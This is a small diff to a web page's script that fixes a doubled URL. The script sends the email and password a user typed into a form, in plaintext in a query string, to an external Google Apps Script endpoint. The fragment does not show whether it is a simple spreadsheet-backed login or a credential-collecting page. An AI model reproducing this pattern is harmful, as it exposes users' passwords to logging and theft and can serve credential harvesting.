@@ -38,7 +38,7 @@ body {
     const email = document.getElementById("email-id").value;
     const password = document.getElementById("password").value;
 
-    fetch("https://script.google.com/macros/s/https://script.google.com/macros/s/AKfycbyPuojERNQGneV9zYDbDNucKQcA7cRr9eCiulOnl0Z4dRVPCyrq-6sR8ExT6IrnM5UP-g/exec/exec?email=" + email + "&password=" + password)
+    fetch("https://script.google.com/macros/s/AKfycbyPuojERNQGneV9zYDbDNucKQcA7cRr9eCiulOnl0Z4dRVPCyrq-6sR8ExT6IrnM5UP-g/exec?email=" + email + "&password=" + password)
       .then((res) => res.text())
       .then((data) => {
         if (data === "success") {
